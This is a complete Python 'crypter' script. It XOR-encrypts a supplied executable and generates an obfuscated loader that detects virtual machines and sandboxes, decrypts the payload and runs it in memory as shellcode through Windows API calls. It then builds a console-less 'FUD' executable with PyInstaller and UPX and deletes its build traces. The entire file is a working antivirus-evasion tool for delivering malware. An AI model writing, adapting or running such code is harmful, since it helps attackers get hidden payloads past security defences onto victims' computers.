import sys
import os
import random
import subprocess
import shutil

def xor_data(data, key):
    return bytes([b ^ key for b in data])

def obfuscate_imports():
    imports = ['ctypes', 'subprocess', 'os', 'time', 'platform']
    obfuscated = {}
    for imp in imports:
        obfuscated[imp] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 12)))
    return obfuscated

def generate_loader(encrypted_bytes, key, obf):
    hex_payload = ",".join([str(b) for b in encrypted_bytes])
    random_sleep = random.randint(1, 4)
    junk_variable = ''.join(random.choices('abcdef', k=10))
    junk_variable2 = ''.join(random.choices('uvwxyz', k=8))
    junk_code = ''.join(random.choices('qwertyuiopasdfghjklzxcvbnm', k=50))

    return f"""
import {obf['ctypes']} as c
import {obf['subprocess']} as sp
import {obf['os']} as o
import {obf['time']} as t
import {obf['platform']} as p

def {junk_variable}(d, k):
    return bytes([b ^ k for b in d])

def {junk_variable2}():
    indicators = ['VBOX', 'VMWARE', 'VIRTUAL', 'SANDBOX', 'XEN']
    for indicator in indicators:
        if indicator.lower() in p.platform().lower():
            return True
    try:
        if t.time() - o.stat(o.environ['SystemRoot']).st_ctime < 600:
            return True
        import psutil
        if psutil.cpu_count(logical=True) <= 2:
            return True
        if psutil.virtual_memory().total <= 2 * 1024 * 1024 * 1024:
            return True
    except:
        pass
    return False

def {junk_code}():
    x = 0
    for i in range(1000):
        x += i**2
    return x

if {junk_variable2}():
    exit()

payload = bytes([{hex_payload}])
decrypted = {junk_variable}(payload, {key})

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40
ptr = c.windll.kernel32.VirtualAlloc(None, len(decrypted), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
c.windll.kernel32.RtlMoveMemory(ptr, decrypted, len(decrypted))
handle = c.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
c.windll.kernel32.WaitForSingleObject(handle, -1)

t.sleep({random_sleep})
"""

def main():
    if len(sys.argv) != 2:
        print("Usage: python crypter.py <file_path>")
        return

    file_path = sys.argv[1]
    if not os.path.exists(file_path):
        print("[!] File not found.")
        return

    with open(file_path, "rb") as f:
        original_data = f.read()

    xor_key = random.randint(1, 255)
    encrypted_data = xor_data(original_data, xor_key)
    obf_names = obfuscate_imports()

    loader_code = generate_loader(encrypted_data, xor_key, obf_names)

    output_script = f"loader_{os.path.basename(file_path).replace('.exe', '')}.py"
    with open(output_script, "w", encoding="utf-8") as f:
        f.write(loader_code)

    print(f"[+] Loader script created: {output_script}")

    exe_name = input("[?] Enter desired name for the final FUD .exe (example: payload.exe): ").strip()
    if not exe_name.endswith(".exe"):
        exe_name += ".exe"

    print("[*] Building FUD executable using PyInstaller...")
    try:
        subprocess.run([
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--name", exe_name.replace(".exe", ""),
            output_script
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] PyInstaller failed: {e}")
        return

    built_exe = os.path.join("dist", exe_name.replace(".exe", "") + ".exe")
    final_exe = os.path.join("build_output", exe_name)

    if not os.path.exists("build_output"):
        os.makedirs("build_output")

    if os.path.exists(built_exe):
        print("[*] UPX Packing executable...")
        try:
            subprocess.run(["upx", "--ultra-brute", built_exe], check=True)
        except Exception as e:
            print(f"[!] UPX packing failed: {e}")

        shutil.move(built_exe, final_exe)
        print(f"[✅] FUD Executable created at: build_output/{exe_name}")
    else:
        print("[!] Build failed. Executable not found.")

    # Clean temp files
    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder)

    spec_file = output_script.replace(".py", ".spec")
    if os.path.exists(spec_file):
        os.remove(spec_file)

    if os.path.exists(output_script):
        os.remove(output_script)

    print("[*] Build complete. Workspace cleaned.")

if __name__ == "__main__":
    main()
